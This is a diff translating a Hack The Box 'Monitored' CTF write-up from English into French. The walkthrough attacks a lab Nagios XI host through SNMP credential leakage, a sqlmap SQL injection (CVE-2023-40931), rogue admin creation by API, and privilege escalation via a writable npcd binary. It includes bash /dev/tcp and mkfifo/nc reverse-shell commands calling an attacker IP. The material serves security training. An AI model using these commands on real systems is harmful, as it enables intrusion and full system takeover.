@@ -14,9 +14,9 @@ categories = ['Writeups']
 * OS: Linux
 ---
 
-Monitored emphasizes rigorous enumeration, the challenge starts with a login form for Nagios XI and directory enumeration leads to the discovery of more and more endpoints. After exhausting all the leads from our nmap TCP scan we make use of a UDP scan to find an exploitable service leading to the leakage of credentials that we use to login. We are able to discover the software version on the target and we leverage `CVE-2023-40931` to  add a new admin account to the Nagios XI instance to grant us access. By executing a command in Nagios XI we gain our initial foothold to recover the user flag, and by manipulating some services we escalate our privileges to find the root flag. 
+Monitored met l'accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l'énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d'identifiants que nous utilisons pour nous connecter. Nous découvrons la version du logiciel sur la cible et utilisons le `CVE-2023-40931` pour ajouter un nouveau compte administrateur à l'instance de Nagios XI afin de nous accorder l'accès. En exécutant une commande (reverse shell) dans Nagios XI, un accès initial est établi et en manipulant certains services, nous escaladons nos privilèges pour pour accéder au compte root. 
 
-Target IP - `10.10.11.248`
+Adresse IP cible - `10.10.11.248`
 
 ## Scanning
 
@@ -24,7 +24,7 @@ Target IP - `10.10.11.248`
 nmap -sC -sV -oA nmap/Monitored 10.10.11.248
 ```
 
-**Results**
+**Résultats**
 
 ```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 11:55 CDT
@@ -56,7 +56,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
 ```
 
-Four open ports are found, 22 (SSH), 80 (HTTP with Apache), 389 (LDAP), 443 (HTTPS). We also get redirected to `nagios.monitored.htb/`.
+Quatre ports ouverts sont détectés, 22 (SSH), 80 (HTTP avec Apache), 389 (LDAP), 443 (HTTPS). Nous sommes également redirigés vers `nagios.monitored.htb/`.
 
 ```
 sudo echo "10.10.11.248 monitored.htb nagios.monitored.htb" | sudo tee -a /etc/hosts
@@ -64,17 +64,17 @@ sudo echo "10.10.11.248 monitored.htb nagios.monitored.htb" | sudo tee -a /etc/h
 
 ## Enumération
 
-Navigating to `https://nagios.monitored.htb/` we find a page leading us to a Nagios XI login page after we click on `Access Nagios XI`.
+Nous trouvons une page de login Nagios XI après avoir cliqué sur `Access Nagios XI` lorsque nous visitons `https://nagios.monitored.htb/`
 
 ![Nagios XI](/images/HTB-Monitored/Nagios-XI.png)
 
-The url is `https://nagios.monitored.htb/nagiosxi/login.php`. We lack the credentials to login at this moment.
+L'url de cette page est `https://nagios.monitored.htb/nagiosxi/login.php`. Nous n'avons pas les identifiants pour nous connecter pour le moment.
 
 ![Nagios-login-XI](/images/HTB-Monitored/Nagios-XI-login.png)
 
-> Nagios is an **Open Source IT system monitoring tool**. It was designed to run on the Linux operating system and can monitor devices running Linux, Windows and Unix OSes.
+> Nagios est un **outil open source de surveillance des systèmes informatiques**. Il a été conçu pour fonctionner sur le système d'exploitation Linux et peut surveiller des appareils fonctionnant sous Linux, Windows et Unix.
 
-We can do some directory enumeration with ffuf. Let's start with `https://nagios.monitored.htb/`.
+Nous pouvons faire une énumération de répertoires avec ffuf. Commençons par `https://nagios.monitored.htb/`.
 
 ```
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
@@ -82,11 +82,11 @@ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.tx
 
 ![Subdomain fuzzing](/images/HTB-Monitored/fuzz.png)
 
-Visiting `https://nagios.monitored.htb/nagios` prompt us to log in but we don't have any credentials at this point.
+Nous trouvons un point de terminaison `/nagios` et la visite de `https://nagios.monitored.htb/nagios` nous invite à nous connecter, mais nous n'avons pas d'informations d'identification à ce stade.
 
 ![Second Nagios Login form](/images/HTB-Monitored/nagios-login.png)
 
-Next we fuzz `https://nagios.monitored.htb/nagiosxi/` and multiple results are found.
+Ensuite, nous examinons `https://nagios.monitored.htb/nagiosxi/` et plusieurs résultats sont obtenus.
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/FUZZ' -e .php,.html,.txt -ic -fc 404 -c
@@ -94,17 +94,17 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
 
 ![Ffuf directory enumeration](/images/HTB-Monitored/ffuf.png)
 
-* Most of these endpoints redirect to the login page probably because we need to be authenticated in order to access them. 
+* La plupart de ces points de terminaison redirigent vers la page de connexion, probablement parce que nous devons être authentifiés pour y accéder. 
 
-* `/images` and `/api` return `Forbidden`.
+* `/images` et `/api` renvoient `Forbidden`.
 
 ![Forbidden page](/images/HTB-Monitored/forbidden.png)
 
-* `/terminal` brings up a page titled `Shell In A Box` where we have access to a terminal in the browser to login into something.
+* `/terminal` présente une page intitulée `Shell In A Box` où nous avons accès à un terminal dans le navigateur pour nous connecter.
 
 ![Nagios XI terminal endpoint](/images/HTB-Monitored/terminal.png)
 
-Going deeper, `/images` reveals more results but we don't have the permissions to access them.
+En allant plus en profondeur, `/images` révèle davantage de résultats, mais nous n'avons pas les permissions pour y accéder.
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/images/FUZZ' -ic -c
@@ -113,7 +113,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
 
 ![Images endpoint enumeration - Renewal](/images/HTB-Monitored/renewals.png)
 
-Doing the same thing for `/api` we find `/includes` and `/v1`.
+En faisant la même chose pour `/api`, nous trouvons `/includes` et `/v1`.
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u 'https://nagios.monitored.htb/nagiosxi/api/FUZZ' -ic -c
@@ -121,80 +121,78 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u 'https://na
 
 ![api endpoint enumeration](/images/HTB-Monitored/api.png)
 
-`includes` doesn't give anything useful but `v1` does returns a few interesting results.
+`includes` ne donne rien d'utile mais `v1` renvoie quelques résultats intéressants.
 
 ```
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u 'https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ' -ic -fs 32 -fc 403
 ```
 ![api endpoint enumeration - v1](/images/HTB-Monitored/v1-fuzz.png)
 
-Both `license` and `autheticate` return errors.
+`license` et `autheticate` renvoient tous deux des erreurs.
 
 ![api endpoint enumeration - v1 - license](/images/HTB-Monitored/license.png)
 
 ![api endpoint enumeration - v1 - authenticate](/images/HTB-Monitored/authenticate.png)
 
-At this point we have enumerated everything we discovered. So far we have found:
+À ce stade, nous avons énuméré tous les éléments découverts. Pour le moment, nous avons trouvé:
 
-* Three login pages:
+* Trois pages de connexion:
 	* https://nagios.monitored.htb/nagiosxi/
 	* https://nagios.monitored.htb/nagiosxi/terminal
 	* https://nagios.monitored.htb/nagios
 
-* An authentication endpoint at https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
+* Un point de terminaison d'authentification à l'adresse https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
 
-It is clear that we need some credentials to access the target system.
+Il apparaît clairement que nous avons besoin d'informations d'identification pour accéder au système cible.
 
-> Although UDP scans are rarely needed in CTFs, we should be as thorough as possible with our scanning. I scratched my head for a long time because I forgot about UDP scans.
+> Bien que les scans UDP soient rarement nécessaires dans les CTF, nous nous devons d'être aussi minutieux que possible dans notre reconnaissance. Je suis resté bloqué pendant longtemps après avoir omis d'utiliser un scan UDP.
 
-Let's try a UDP scan.
+Lançons un scan UDP.
 
 ```
 sudo nmap -sU -sC -sV -vv 10.10.11.248
 ```
-> This command will produce a lot of output and keep in mind that UDP scan are usually slower.
+> Il est normal pour les scans UDP de prendre beaucoup de temps, ils sont généralement plus lents. 
 
 ![nmap UDP scan](/images/HTB-Monitored/udp-scan.png)
 
-Four ports will be discovered:
+Quatre ports seront découverts:
 * 68 - DHCP
 * 123 - NTP
 * 161 - SNMPv1
 * 162 - SNMPv3
 
-The most likely way to exploitation is SNMP. We can use `snmpwalk` to enumerate the service. We note that two versions of SNMP are used here, we will specify `SNMP V1` since it's less secure.
+Essayons d'exploiter SNMP. Nous pouvons utiliser `snmpwalk` pour énumérer le service. Notons que deux versions de SNMP sont utilisées ici, nous spécifierons `SNMP V1` car elle est moins sécurisée.
 
-> The command below creates a lot of output on the terminal so I sent it to a file.
+> La commande ci-dessous génère beaucoup de données sur le terminal, il est donc préférable de l'envoyer dans un fichier.
 
 ```
 snmpwalk -c public -v1 -t 10 10.10.11.248 > snmp.txt
 ```
 
-Going over the output I find some lines referencing a script `/opt/scripts/check_host.sh` with what seems to look like some credentials `svc:XjH7VCehowpR1xZB`.
+En examinant le contenu du fichier, nous trouvons quelques lignes faisant référence à un script `/opt/scripts/check_host.sh` avec ce qui semble être des informations d'identification `svc:XjH7VCehowpR1xZB`.
 
 ![SNMP potential credentials](/images/HTB-Monitored/creds-snmp.png)
 
-The credentials did not work on `https://nagios.monitored.htb/nagiosxi/terminal/` and we get the message that this user account is either disabled or non-existent at `https://nagios.monitored.htb/nagiosxi/login.php`. 
+Les identifiants ne fonctionnent pas sur `https://nagios.monitored.htb/nagiosxi/terminal/` et nous constatons que ce compte utilisateur est soit désactivé, soit inexistant sur `https://nagios.monitored.htb/nagiosxi/login.php`. 
 
 ![NagiosXI login attempt failed](/images/HTB-Monitored/nagiosxi-login-attempt.png)
 
 ## Accès Initial
 
-At `https://nagios.monitored.htb/nagios` we are able to login. On that page we see a PID and the software version. Trying to reuse the cookie value from this page on `/nagiosxi` also fails.
+Sur `https://nagios.monitored.htb/nagios`, nous pouvons nous connecter. La page affiche un PID et la version du logiciel. Essayer de réutiliser le cookie de cette page sur `/nagiosxi` échoue également.
 
 ![NagiosXI login attempt successful](/images/HTB-Monitored/nagios-core.png)
 
-Searching for vulnerabilities for that specific software version we end finding [three CVEs](https://outpost24.com/blog/nagios-xi-vulnerabilities/). They all allow users, with various levels of privileges, to access database fields via SQL injections.
+En recherchant les vulnérabilités pour cette version spécifique du logiciel, nous trouvons [trois CVE](https://outpost24.com/blog/nagios-xi-vulnerabilities/). Ces vulnérabilités permettent à des utilisateurs disposant de différents niveaux de privilèges d'accéder à des champs de la base de données par le biais d'injections SQL.
 
 ![NagiosXI vulnerabilities](/images/HTB-Monitored/nagios-vulns.png)
 
-We find a good explanation for the vulnerability in the post.
-
 ![CVE-2023-40931-EXPLAINED](/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png)
 
-We recall that back on the `/api/v1/authenticate` we saw the message `You can only use POST with authenticate.`
+Rappelons que sur `/api/v1/authenticate` nous avons vu le message `Vous ne pouvez utiliser POST qu'avec authenticate.`
 
-1. We send a POST request to that endpoint with the credentials of the user and receive a token 
+1. Nous envoyons une requête POST à ce point de terminaison avec les informations d'identification de l'utilisateur et nous recevons un token 
 
 ```
 curl -k -L -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" -d "username=svc&password=XjH7VCehowpR1xZB"
@@ -202,33 +200,33 @@ curl -k -L -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" -
 
 ![Token retrieval](/images/HTB-Monitored/token-retrieval.png)
 
-2. We use this token to launch an SQL injection
+2. Nous utilisons ce token pour lancer une injection SQL
 
 ```
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae" -p id --level 5 --risk 3 --dump 
 ```
 
-Once you see `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]` enter `N`.
+Lorsque le message `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]` apparaît entrez `N`.
 
 ![SQLmap command](/images/HTB-Monitored/sqlmap.png)
 
-SQLmap will start dumping all the tables of the database on the terminal but we can inspect the tables we are interested in by going to `/home/<YOUR_USERNAME>/.local/share/sqlmap/output/nagios.monitored.htb/dump/`. We know that the exploit is related to the tables `xi_session` and `xi_users`.
+SQLmap commencera à extraire toutes les tables de la base de données mais nous pouvons inspecter les tables qui nous intéressent en allant dans `/home/<Votre_nom_d'utilisateur>/.local/share/sqlmap/output/nagios.monitored.htb/dump/`. Nous savons que la vulnérabilité est liée aux tables `xi_session` et `xi_users`.
 
 ![SQLmap tables dump](/images/HTB-Monitored/tables-dumped.png)
 
-You can also scroll through the output on the terminal and find the `xi_users` table dump. We find the API key for the `Nagios Administrator` user `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`.
+Vous pouvez aussi défiler sur le terminal et trouver le dump de la table `xi_users`. Nous trouvons la clé API pour l'utilisateur `Nagios Administrator` `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`.
 
 ![API key found](/images/HTB-Monitored/API-key.png)
 
-> Passwords hashes are also present in the dump but we are unable to crack them.
+> Des hashs de mots de passe sont également présents dans le dump mais nous ne sommes pas en mesure de les craquer.
 
-Still we don't have any valid credentials to login into Nagios XI and there is no way to sign up. Our only option is to find how to add a new account.
+Nous n'avons toujours pas d'identifiants valides pour nous connecter à Nagios XI et il n'y a aucun moyen de s'inscrire. Notre seule option est de trouver comment ajouter un nouveau compte.
 
-After some research we find how to add new users via the API [here](https://support.nagios.com/forum/viewtopic.php?t=42923) and on [this](https://support.nagios.com/forum/viewtopic.php?f=6&t=40502) page we also find that we can add an admin account by using the `auth_level` parameter. 
+Après quelques recherches, nous trouvons comment ajouter de nouveaux utilisateurs via l'API [ici](https://support.nagios.com/forum/viewtopic.php?t=42923) et sur cette [page](https://support.nagios.com/forum/viewtopic.php?f=6&t=40502) nous apprenons également comment ajouter un compte administrateur en utilisant le paramètre `auth_level`.
 
 ![NagiosXI add users via API](/images/HTB-Monitored/nagiosxi-api.png)
 
-The command below is used to create a new admin user.  The `username`, `email`, `name`, and `password` fields are required.
+La commande ci-dessous est utilisée pour créer un nouvel utilisateur admin.  Les champs `username`, `email`, `name`, et `password` sont obligatoires.
 
 ```
 curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=adminsec&password=password123&name=kscorpio&email=kscorpio@monitored.htb&auth_level=admin"
@@ -236,53 +234,51 @@ curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd
 
 ![User added via API successfully](/images/HTB-Monitored/user-created.png)
 
-With the account newly created we are able to log into Nagios XI at `https://nagios.monitored.htb/nagiosxi/`
+Avec le compte nouvellement créé, nous pouvons nous connecter à Nagios XI à l'adresse `https://nagios.monitored.htb/nagiosxi/`.
 
-> You will be asked to change the password once you login.
+> Il vous sera demandé de changer le mot de passe après votre connexion.
 
 ![NagiosXI login success](/images/HTB-Monitored/nagiosxi-login.png)
 
-On the Dashboard, hover on the `Configure` menu and select `Core Config Manager`.
+Sur le tableau de bord, survolez le menu `Configure` et sélectionnez `Core Config Manager`.
 
 ![NagiosXI config](/images/HTB-Monitored/nagiosxi-config.png)
 
-Select `Commands` and then `Add New`.
+Sélectionnez `Commandes` et ensuite `Add New`.
 
 ![Core Config Manager](/images/HTB-Monitored/config-cmd.png)
 
 ![Add new command](/images/HTB-Monitored/new-cmd.png)
 
-Add a reverse shell command and save it.  For example: `bash -c 'bash -i >& /dev/tcp/<IP_Address>/<Port> 0>&1'`
+Ajoutez une commande reverse shell et sauvegardez-la.  Par exemple: `bash -c 'bash -i >& /dev/tcp/<IP_Address>/<Port> 0>&1'`.
 
 ![Reverse shell command](/images/HTB-Monitored/rev-shell-cmd.png)
 
-You also have to click `Apply Configuration` for the new command to be listed. Now you should see `149 Commands`.
+Vous devez également cliquer sur `Apply Configuration` pour que la nouvelle commande soit listée. Vous devriez maintenant voir `149 Commands`.
 
 ![Apply configuration](/images/HTB-Monitored/apply-config.png)
 
-Let's start a listener on the port specified in our command.
+Démarrons un listener sur le port spécifié dans notre commande.
 
-To run the command Go to `Monitoring` > `Hosts` > click on `localhost`.
+Pour lancer la commande, allez dans `Monitoring` > `Hosts` > cliquez sur `localhost`.
 
 ![Configuration - localhost](/images/HTB-Monitored/localhost.png)
 
-Under `Check command`, select your command and click `Run Check Commad` and you will get a connection on your listener.
+Sous `Check command`, sélectionnez votre commande et cliquez sur `Run Check Command` et vous obtiendrez une connexion sur votre listener.
 
 ![Initial Foothold](/images/HTB-Monitored/nagios-shell.png)
 
-You can get the user flag at `/home/nagios/user.txt`.
+Le premier flag est accessible à `/home/nagios/user.txt`.
 
 ![User flag](/images/HTB-Monitored/user-flag.png)
 
 ## Elévation de Privilèges
 
-Running `sudo -l` we discover that the user can manipulate two services `nagios` and `npcd` in addition to running various scripts.
+En exécutant `sudo -l` nous découvrons que l'utilisateur peut manipuler deux services `nagios` et `npcd` en plus de pouvoir exécuter divers scripts.
 
 ![sudo -l command](/images/HTB-Monitored/sudo-l.png)
 
-> The npcd service in Nagios is a **daemon** responsible for processing **performance data** received from Nagios checks.
-
-Using the `find` command we get the exact locations of `nagios` and `npcd`.
+En utilisant la commande `find`, nous obtenons les emplacements exacts de `nagios` et de `npcd`.
 
 ```
 find / -name nagios 2> /dev/null
@@ -292,17 +288,17 @@ find / -name npcd 2> /dev/null
 
 ![services locations](/images/HTB-Monitored/services-location.png)
 
-We also check the permissions of the binaries and we notice that we have write permission for  `npcd`. We can edit the file content and replace it with a malicious command to get a shell.
+Nous vérifions également les permissions des binaires et nous notons que nous avons les permissions d'écriture pour `npcd`. Nous pouvons éditer le contenu du fichier et le remplacer par une commande malveillante pour obtenir un shell.
 
 ![Binaries permissions](/images/HTB-Monitored/binaries-perms.png)
 
-1. Stop the service 
+1. Stopper le service
 
 ```
 sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
 ```
 
-2. Edit `npcd` 
+2. Editer `npcd`
 
 ```
 echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
@@ -310,17 +306,17 @@ echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.4 5555 >/tmp/f' >> /usr/local/nagios/bin/npcd
 ```
 
-3. Start a listener and start the `npcd` service using the script.
+3. Démarrez un listener et démarrez le service `npcd` à l'aide du script
 
 ```
 sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
 ```
 
-We get a root shell on our listener and we can read the root flag at `/root/root.txt`.
+Nous obtenons un shell root sur notre listener et nous pouvons lire le drapeau root dans `/root/root.txt`.
 
 ![Root flag](/images/HTB-Monitored/root-flag.png)
 
-Monitored was a fun challenge forcing me to up my scanning and enumeration game, this was the first time I had to use a UDP scan for a CTF. I hope this write up was helpful! If you have any questions you can leave a comment (which requires a Github account) or you can reach out on Twitter at [_KScorpio](https://twitter.com/_KScorpio).
+J'espère que cet article vous a été utile! Si vous avez des questions, vous pouvez laisser un commentaire (nécessite un compte Github) ou vous pouvez me contacter sur Twitter à [_KScorpio](https://twitter.com/_KScorpio).
 
 
 
